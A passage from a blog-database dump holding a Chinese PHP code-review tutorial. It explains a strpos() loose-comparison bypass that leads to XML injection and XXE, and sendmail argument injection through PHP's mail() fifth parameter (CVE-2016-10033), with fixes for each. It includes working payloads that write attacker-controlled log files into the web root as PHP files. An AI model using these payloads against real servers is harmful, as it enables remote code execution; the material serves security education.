title=\"修复\"></a>修复</h3><p> 1.将<code>class_exist</code>函数中的<code>bool $autoload</code>参数设为false，即不自动调用<code>__autoload</code>函数；或者<code>__autoload函数</code>中不要使用<code>include</code>函数；或升级PHP版本避免路径遍历符号的传递。</p>\n<p> 2.PHP中防御XXE攻击方法：设置<code>libxml_disable_entity_loader(true);</code>；当然最大的问题还是不应该让实例化对象变成用户输入可控。</p>\n<hr>\n<h2 id=\"strpo-函数误用\"><a href=\"#strpo-函数误用\" class=\"headerlink\" title=\"strpo()函数误用\"></a>strpo()函数误用</h2><p>源码如下：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Login</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loginViaXml</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (</span><br><span class=\"line\">            (!strpos($user, <span class=\"string\">'&lt;'</span>) || !strpos($user, <span class=\"string\">'&gt;'</span>)) &amp;&amp;</span><br><span class=\"line\">            (!strpos($pass, <span class=\"string\">'&lt;'</span>) || !strpos($pass, <span class=\"string\">'&gt;'</span>))</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            $format = <span class=\"string\">'&lt;?xml version=\"1.0\"?&gt;'</span> .</span><br><span class=\"line\">                      <span class=\"string\">'&lt;user v=\"%s\"/&gt;&lt;pass v=\"%s\"/&gt;'</span>;</span><br><span class=\"line\">            $xml = sprintf($format, $user, $pass);</span><br><span class=\"line\">            $xmlElement = <span class=\"keyword\">new</span> SimpleXMLElement($xml);</span><br><span class=\"line\">            <span class=\"comment\">// Perform the actual login.</span></span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;login($xmlElement);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> Login($_POST[<span class=\"string\">'username'</span>], $_POST[<span class=\"string\">'password'</span>]);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>可以看到此段代码的第8，9行使用<code>strpo()</code>函数检查payload中是否有<code>&lt;`</code>&gt;<code>符号，以检查XML利用的敏感符号。检查后传入第11、12行的</code>$format<code>变量中，然后格式化生成XML。</code>strpos()`函数文档如下：</p>\n<blockquote>\n<p><strong>strpos</strong></p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>strpos — 查找字符串首次出现的位置</p>\n<p><strong>说明</strong><br>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )<br>返回 needle 在 haystack 中首次出现的数字位置。</p>\n<p><strong>参数</strong><br>haystack<br>在该字符串中进行查找。</p>\n<p>needle<br>如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。</p>\n<p>offset<br>如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。</p>\n<p><strong>返回值</strong><br>返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。</p>\n<p>如果没找到 needle，将返回 FALSE。</p>\n<p><strong>Warning</strong><br>此函数可能返回布尔值 FALSE，但也可能返回等同于 FALSE 的非布尔值。请阅读 布尔类型章节以获取更多信息。应使用 === 运算符来测试此函数的返回值。</p>\n</blockquote>\n<p>这里<strong>Warning</strong>中已经提示了<code>strpos()</code>可能返回等同于FALSE的非布尔值，即在首位查询到了条件并返回了值为<code>0</code>，又因为PHP的弱类型特性，若没有使用<code>===</code>的强匹配，<code>0</code>就会等于<code>false</code>。</p>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p> 前文已分析到令查询位置为首位即可，故payload可以为<code>user=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</code></p>\n<p> 其中首位的<code>&lt;</code>可以令<code>strpo()</code>函数返回<code>0</code>即<code>FALSE</code>，从而绕过检查，<code>&quot;&gt;</code>是为了闭合之前的内容，然后就可以利用XML进行各种XXE攻击的利用</p>\n<h3 id=\"修复-3\"><a href=\"#修复-3\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>使用<code>===</code>强匹配</p>\n<hr>\n<h2 id=\"mali-函数的危险性\"><a href=\"#mali-函数的危险性\" class=\"headerlink\" title=\"mali()函数的危险性\"></a>mali()函数的危险性</h2><p>源代码：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mailer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sanitize</span><span class=\"params\">($email)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">''</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> escapeshellarg($email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">send</span><span class=\"params\">($data)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'to'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'to'</span>] = <span class=\"string\">'none@ripstech.com'</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'to'</span>] = <span class=\"keyword\">$this</span>-&gt;sanitize($data[<span class=\"string\">'to'</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'from'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'from'</span>] = <span class=\"string\">'none@ripstech.com'</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'from'</span>] = <span class=\"keyword\">$this</span>-&gt;sanitize($data[<span class=\"string\">'from'</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'subject'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'subject'</span>] = <span class=\"string\">'No Subject'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'message'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'message'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        mail($data[<span class=\"string\">'to'</span>], $data[<span class=\"string\">'subject'</span>], $data[<span class=\"string\">'message'</span>],</span><br><span class=\"line\">             <span class=\"string\">''</span>, <span class=\"string\">\"-f\"</span> . $data[<span class=\"string\">'from'</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mailer = <span class=\"keyword\">new</span> Mailer();</span><br><span class=\"line\">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>此漏洞主要是由于<code>mail()</code>函数的第五个参数，先看一下<code>mail()</code>函数的用法：</p>\n<blockquote>\n<p><strong>mail</strong></p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>mail — 发送邮件</p>\n<p><strong>说明</strong></p>\n<p>bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )<br>发送一封电子邮件。</p>\n<p><strong>参数</strong></p>\n<p><strong>to</strong><br>收件人<br><strong>subject</strong><br>主题<br><strong>message</strong><br>邮件内容<br><strong>additional_headers</strong><br>添加邮件的额外头部，如<code>CC:</code>Carbon Copy(抄送)、<code>BCC:</code>Blind CarbonCopy(秘密抄送)<br><strong>additional_parameters</strong><br>传递给发送程序sendmail的额外参数。例如，当使用带有-f sendmail选项的sendmail时，可以使用此选项设置邮件发件人地址 。</p>\n</blockquote>\n<p>在Linux系统上， php 的 mail 函数在底层中已经写好了，默认调用 Linux 的 <strong>sendmail</strong> 程序发送邮件。而在额外参数( additional_parameters )中， sendmail 主要支持的选项有以下三种：</p>\n<blockquote>\n<p>-O option = value</p>\n<p>QueueDirectory = queuedir 选择队列消息</p>\n<p>-X logfile</p>\n<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>\n<p>-f from email</p>\n<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>\n</blockquote>\n<p> 在PHP中使用<code>mail()</code>函数的话需要在<code>php.ini</code>中配置以下两个选项中的一种：<br> 1.配置好SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议的服务器hostname和port来告诉PHP使用那个代理。<br> 2.配置好一个邮件程序的文件地址，使其作为MTA(Mail Transfer Agent)即邮件传输代理。</p>\n<p> 当PHP是用第2种方式配置的时候，<code>mail()</code>将传递给MTA程序运行，虽然PHP默认提供了<code>escapeshellcmd()</code>这个函数在这些<code>&amp;#;|*?~&lt;&gt;^()[]{}$\\, \\x0A 和 \\xFF</code>字符前插入<code>\\</code>进行转义以防止代码注入的安全性问题，但是<code>mail()</code>函数的第5个参数<code>$additional_parameters</code>允许用户添加新参数的特性使得可以被攻击者利用。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mail(<span class=\"string\">\"myfriend@example.com\"</span>, <span class=\"string\">\"subject\"</span>, <span class=\"string\">\"message\"</span>, <span class=\"string\">\"\"</span>, <span class=\"string\">\"-f\"</span> . $_GET[<span class=\"string\">'from'</span>]); <span class=\"comment\">//程序代码举例</span></span><br><span class=\"line\"></span><br><span class=\"line\">example@example.com -O QueueDirectory=/tmp -X /<span class=\"keyword\">var</span>/www/html/rce.php <span class=\"comment\">//payload举例 -O 可以用来重新配置sendmail选项 -X可以指定日志文件位置</span></span><br></pre></td></tr></table></figure></p>\n<p> 之前PHPMailer漏洞CVE-2016-10033就是这样发现的，影响到了包括像Wordpress这样广泛使用的程序。</p>\n<p> 说完<code>mail()</code>函数继续来分析源码，源码中第17行<code>$data[&#39;from&#39;]</code>为用户可控，并且传入到了第31行<code>mail()</code>函数中的第5参数中。虽然使用了<code>sanitize</code>函数进行过滤，<code>sanitize</code>函数首先调用了<code>FILTER_VALIDATE_EMAIL</code>过滤器验证传入值是否为有效的电子邮件地址，然后使用了<code>escapeshellarg</code>函数对返回值进行了转码过滤。</p>\n<p>首先讨论一下<code>FILTER_VALIDATE_EMAIL</code>这个过滤器，这个过滤器仅仅是以RFC822规则验证邮箱地址是否有效正确，但是并不会验证其安全性。附各PHP版本下绕过<code>FILTER_VALIDATE_EMAIL</code>的运行情况。可以看到在&gt;=5.2.0版本<code>fliter_var()</code>函数才被添加，其中某些版本会返回<strong>false</strong>，所以测试中需要注意版本。</p>\n<p><img src=\"/2018/08/06/php-code-review/FILTER_VALIDATE_EMAIL.jpg\" alt=\"FILTER_VALIDATE_EMAIL\"></p>\n<p>然后我们绕过<code>FILTER_VALIDATE_EMAIL</code>的情况下还需要绕过<code>escapeshellarg（）</code>和<code>escapeshellcmd（）</code>，先看一下PHP文档对这两个函数的描述。</p>\n<blockquote>\n<p><strong>escapeshellarg</strong></p>\n<p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p>\n<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p>\n<p><strong>说明</strong> </p>\n<p>string escapeshellarg ( string $arg )</p>\n<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p>\n</blockquote>\n<blockquote>\n<p><strong>escapeshellcmd</strong></p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>escapeshellcmd — shell 元字符转义</p>\n<p><strong>说明</strong></p>\n<p>string escapeshellcmd ( string $command )</p>\n<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>\n<p>反斜线（\\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A 和 \\xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>\n</blockquote>\n<p>可以看到<code>escapeshellarg（）</code>和底层的<code>escapeshellcmd（）</code>是用来保护系安全，防止代码注入的转义函数。但是<code>escapeshellarg（）</code>和<code>escapeshellcmd（）</code>一起使用的话并不安全。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a=escapeshellarg(<span class=\"string\">\"172.17.0.2' -v -d a=1\"</span>);</span><br><span class=\"line\">$b=escapeshellcmd(<span class=\"string\">\"172.17.0.2' -v -d a=1\"</span>);</span><br><span class=\"line\">$c=escapeshellcmd(escapeshellarg(<span class=\"string\">\"172.17.0.2' -v -d a=1\"</span>));</span><br><span class=\"line\">var_dump($a).PHP_EOL;</span><br><span class=\"line\">var_dump($b).PHP_EOL;</span><br><span class=\"line\">var_dump($c).PHP_EOL;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>如上我们使用<code>172.17.0.2&#39; -v -d a=1</code>这样的payload来进行测试。<br>测试结果如下<br><img src=\"/2018/08/06/php-code-review/escape.jpg\" alt=\"ESCAPE\"><br>可以看到在第1、2、4种输出中，<code>escapeshellcmd(escapeshellarg(&quot;172.17.0.2&#39; -v -d a=1&quot;))</code>的输出为<code>string(28) &quot;&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;&quot;</code><br>详细分析一下：</p>\n<ol>\n<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code>。</li>\n<li>经过escapeshellarg处理后变成了<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d</code>a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>\n<li>经过escapeshellcmd处理后变成<code>&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>，这是因为escapeshellcmd对<code>\\</code>以及最后那个没有配对的<code>&#39;</code>进行了转义，而忽略对之前两对匹配了的<code>&#39;</code>进行转意。</li>\n<li>最后执行的命令是<code>&#39;curl 172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>，由于中间的<code>\\\\</code>被解释为<code>\\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\\</code>发起请求，<strong>POST</strong> 数据为<code>a=1&#39;</code>。</li>\n</ol>\n<p>此处分析学习自<a href=\"https://paper.seebug.org/164/\" title=\"PHP escapeshellarg()+escapeshellcmd() 之殇\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/164/</a></p>\n<h3 id=\"利用-4\"><a href=\"#利用-4\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>最终传入<code>mail()</code>函数的第5参数的payload大概为<code>a&quot;&#39;(\\ -OQueueDirectory=/tmp\\ -X/var/www/html/test.php\\ )&quot;@a.com</code>,在执行时变成了<code>&#39;-fa&quot;&#39;\\\\&#39;&#39;\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)&quot;@a.com\\&#39;</code>，如上面的分析<code>-f</code>为MTA预设参数，<code>&#39;-fa&quot;\\\\&#39;&#39;&#39;\\(</code>为第一部分，转义后运行时相当于<code>-fa&quot;\\(</code>,这部分作用就是将<code>-f</code>参数闭合造成后续payload逃逸形成注入；<code>-OQueueDirectory=/tmp</code>为第二部分可操作恶意内容，<code>-X/var/www/html/test.php</code>为第三部分可操作恶意内容，<code>\\)&quot;@a.com\\&#39;</code>为绕过<code>FILTER_VALIDATE_EMAIL</code>过滤的必须部分。这样结合起来就完成了注入，但是由于邮箱格式要求以及转义过多，真实进行测试时会带有很多<code>&quot;`</code>`<code>&#39;</code>符号，还需要多多调整来进行测试。</p>\n<h3 id=\"修复-4\"><a href=\"#修复-4\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p><strong>PHPmailer</strong>官方的修复方案是，对用户传参的输入进行检测，如果有转义字符就不传递第5参数，也不会造成注入。<br>所以总结一下核心问题还是<code>escapeshellarg()</code>→<code>escapeshellcmd()</code>这一过程会出现重复转义造成的漏洞。</p>\n<hr>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"#\"></a>#</h2>"}],"PostAsset":[{"_id":"source/_posts/web渗透测试（黑盒）/1.jpg","post":"cjrod1l5u0002143ag06quy70","slug":"1.jpg","modified":1,"renderable":1},{"_id":"source/_posts/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/1.jpg","post":"cjrod1l5s0001143aywig2h14","slug":"1.jpg","modified":1,"renderable":1},{"_id":"source/_posts/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/2.jpg","post":"cjrod1l5s0001143aywig2h14","slug":"2.jpg","modified":1,"renderable":1},{"_id":"source/_posts/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/3.jpg","post":"cjrod1l5s0001143aywig2h14","slug":"3.jpg","modified":1,"renderable":1},{"_id":"source/_posts/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/4.jpg","post":"cjrod1l5s0001143aywig2h14","slug":"4.jpg","modified":1,"renderable":1},{"_id":"source/_posts/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/5.jpg","post":"cjrod1l5s0001143aywig2h14","slug":"5.jpg","modified":1,"renderable":1},{"_id":"source/_posts/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/6.jpg","post":"cjrod1l5s0001143aywig2h14","slug":"6.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/asp.png","post":"cjrod1l5w0003143asctzygwz","slug":"asp.png","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/cknife.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"cknife.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/demo.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"demo.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/dis.png","post":"cjrod1l5w0003143asctzygwz","slug":"dis.png","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/google.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"google.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/nmap.png","post":"cjrod1l5w0003143asctzygwz","slug":"nmap.png","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/phpinfo.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"phpinfo.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/phpmyadmin.png","post":"cjrod1l5w0003143asctzygwz","slug":"phpmyadmin.png","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/readme.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"readme.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/sql.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"sql.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/sqlmap.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"sqlmap.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/upimg.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"upimg.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/目录.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"目录.jpg","modified":1,"renderable":1},{"_id":"source/_posts/一次渗透纪实/首页.jpg","post":"cjrod1l5w0003143asctzygwz","slug":"首页.jpg","modified":1,"renderable":1},{"_id":"source/_posts/php-code-review/FILTER_VALIDATE_EMAIL.jpg","post":"cjrod1l7v0008143agvx429bk","slug":"FILTER_VALIDATE_EMAIL.jpg","modified":1,"renderable":1},{"_id":"source/_posts/php-code-review/escape.jpg","post":"cjrod1l7v0008143agvx429bk","slug":"escape.jpg","modified":1,"renderable":1}],"PostCategory":[],"PostTag":[{"post_id":"cjrod1l6n0004143ahym07xbs","tag_id":"cjrod1l6o0006143an4q7d4dw","_id":"cjrod1l6r0007143at0v6naov"}],"Tag":[{"name":"python","_id":"cjrod1l6o0006143an4q7d4dw"}]}}